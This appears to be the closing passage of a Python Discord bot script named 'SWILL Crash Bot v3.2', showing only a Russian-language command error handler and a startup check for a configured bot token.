@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Команда не найдена. Используйте `.sw help` для списка команд")
    elif isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Недостаточно прав для выполнения команды!")
    else:
        await ctx.send(f"⚠️ Произошла ошибка: {str(error)}")

# Запуск бота
if __name__ == "__main__":
    print("🔄 Загрузка SWILL Crash Bot v3.2...")
    
    # Проверка токена
    token = config.get("token")
    if token == "YOUR_BOT_TOKEN_HERE":
        print("❌ ОШИБКА: Токен бота не настроен!")
        print("📝 Откройте файл config.json и замените YOUR_BOT_TOKEN_HERE на реальный токен")
        print("🔗 Получить токен: https://discord.com/developers/applications")
    else:
        print("✅ Токен бота найден")
        bot.run(token)
